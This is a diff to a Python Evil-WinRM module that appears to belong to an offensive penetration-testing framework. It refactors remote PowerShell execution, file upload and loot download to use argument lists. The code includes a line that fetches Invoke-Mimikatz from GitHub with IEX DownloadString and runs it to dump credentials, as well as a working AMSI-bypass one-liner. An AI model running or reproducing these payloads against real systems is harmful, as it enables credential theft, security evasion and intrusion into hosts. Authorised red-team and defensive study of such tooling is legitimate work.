@@ -6,9 +6,9 @@ Shell PowerShell distant via WinRM
 
 from typing import Dict, Any, List, Optional
 from datetime import datetime
-from core.executor import CommandExecutor, escape_shell_arg
+from core.executor import CommandExecutor
 import os
-import re
+import shlex
 
 
 class EvilWinRMModule:
@@ -24,31 +24,44 @@ class EvilWinRMModule:
         self.executor = CommandExecutor()
         self.loot_dir = "/tmp/evil-winrm-loot"
         os.makedirs(self.loot_dir, exist_ok=True)
+
+    def _build_base_args(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        hash_val: str
+    ) -> List[str]:
+        args = ["evil-winrm", "-i", str(target), "-u", str(username)]
+        if password:
+            args.extend(["-p", str(password)])
+        elif hash_val:
+            args.extend(["-H", str(hash_val)])
+        return args
+
+    async def _run_base(
+        self,
+        base_args: List[str],
+        timeout: int,
+        stdin_command: Optional[str] = None
+    ):
+        stdin_data = f"{stdin_command}\n" if stdin_command else None
+        return await self.executor.run_args(base_args, timeout=timeout, stdin_data=stdin_data)
     
     async def check_access(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
         """
         Vérifie l'accès WinRM avec les credentials fournis
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
         hash_val = options.get("hash", "")
         domain = options.get("domain", "")
         
-        # Construire la commande
-        cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            cmd += f" -H {escape_shell_arg(hash_val)}"
-        
-        # Exécuter une commande simple pour tester
-        test_cmd = f"echo 'whoami' | {cmd}"
-        
-        result = await self.executor.run(test_cmd, timeout=30)
+        base_args = self._build_base_args(target, username, password, hash_val)
+        cmd = " ".join(shlex.quote(part) for part in base_args)
+        result = await self._run_base(base_args, timeout=30, stdin_command="whoami")
         
         # Vérifier si l'accès est réussi
         access_ok = "Evil-WinRM" in result.stdout or "PS " in result.stdout or result.return_code == 0
@@ -74,25 +87,15 @@ class EvilWinRMModule:
         Exécute une commande PowerShell via Evil-WinRM
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
         hash_val = options.get("hash", "")
         command = options.get("command", "whoami /all")
         
-        # Construire la commande Evil-WinRM
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
-        
-        # Exécuter la commande via stdin
-        cmd = f"echo '{escape_shell_arg(command)}' | {base_cmd}"
-        
-        result = await self.executor.run(cmd, timeout=120)
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_cmd = " ".join(shlex.quote(part) for part in base_args)
+        result = await self._run_base(base_args, timeout=120, stdin_command=command)
         
         return {
             "action": "evilwinrm_exec",
@@ -114,7 +117,6 @@ class EvilWinRMModule:
         Exécute un script PowerShell via Evil-WinRM
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -130,17 +132,11 @@ class EvilWinRMModule:
                 "timestamp": datetime.now().isoformat()
             }
         
-        # Construire la commande
-        cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_args.extend(["-s", os.path.dirname(script_path)])
+        cmd = " ".join(shlex.quote(part) for part in base_args)
         
-        if password:
-            cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            cmd += f" -H {escape_shell_arg(hash_val)}"
-        
-        cmd += f" -s {escape_shell_arg(os.path.dirname(script_path))}"
-        
-        result = await self.executor.run(cmd, timeout=300)
+        result = await self.executor.run_args(base_args, timeout=300)
         
         return {
             "action": "evilwinrm_script",
@@ -161,7 +157,6 @@ class EvilWinRMModule:
         Upload un fichier vers la cible
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -178,20 +173,13 @@ class EvilWinRMModule:
                 "timestamp": datetime.now().isoformat()
             }
         
-        # Construire la commande
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_cmd = " ".join(shlex.quote(part) for part in base_args)
         
         filename = os.path.basename(local_file)
         upload_cmd = f"upload {local_file} {remote_path}{filename}"
-        
-        cmd = f"echo '{upload_cmd}' | {base_cmd}"
-        
-        result = await self.executor.run(cmd, timeout=300)
+
+        result = await self._run_base(base_args, timeout=300, stdin_command=upload_cmd)
         
         return {
             "action": "evilwinrm_upload",
@@ -213,7 +201,6 @@ class EvilWinRMModule:
         Télécharge un fichier depuis la cible
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -229,20 +216,13 @@ class EvilWinRMModule:
                 "timestamp": datetime.now().isoformat()
             }
         
-        # Construire la commande
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_cmd = " ".join(shlex.quote(part) for part in base_args)
         
         local_path = os.path.join(self.loot_dir, os.path.basename(remote_file))
         download_cmd = f"download {remote_file} {local_path}"
-        
-        cmd = f"echo '{download_cmd}' | {base_cmd}"
-        
-        result = await self.executor.run(cmd, timeout=300)
+
+        result = await self._run_base(base_args, timeout=300, stdin_command=download_cmd)
         
         return {
             "action": "evilwinrm_download",
@@ -264,7 +244,6 @@ class EvilWinRMModule:
         Exécute Invoke-Mimikatz via Evil-WinRM (si disponible)
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -274,16 +253,9 @@ class EvilWinRMModule:
         # Commande PowerShell pour charger et exécuter Mimikatz
         ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '{mimikatz_cmd}'"
         
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
-        
-        cmd = f"echo \"{ps_cmd}\" | {base_cmd}"
-        
-        result = await self.executor.run(cmd, timeout=180)
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_cmd = " ".join(shlex.quote(part) for part in base_args)
+        result = await self._run_base(base_args, timeout=180, stdin_command=ps_cmd)
         
         # Parser les credentials
         creds = self._parse_mimikatz_output(result.stdout)
@@ -308,7 +280,6 @@ class EvilWinRMModule:
         Tente de bypasser AMSI
         """
         options = options or {}
-        target_safe = escape_shell_arg(target)
         
         username = options.get("username", "")
         password = options.get("password", "")
@@ -320,18 +291,13 @@ class EvilWinRMModule:
             "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
         ]
         
-        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
-        
-        if password:
-            base_cmd += f" -p {escape_shell_arg(password)}"
-        elif hash_val:
-            base_cmd += f" -H {escape_shell_arg(hash_val)}"
+        base_args = self._build_base_args(target, username, password, hash_val)
+        base_cmd = " ".join(shlex.quote(part) for part in base_args)
         
         # Essayer la première technique
         ps_cmd = bypass_techniques[0]
-        cmd = f"echo \"{ps_cmd}\" | {base_cmd}"
-        
-        result = await self.executor.run(cmd, timeout=60)
+
+        result = await self._run_base(base_args, timeout=60, stdin_command=ps_cmd)
         
         return {
             "action": "evilwinrm_amsi_bypass",
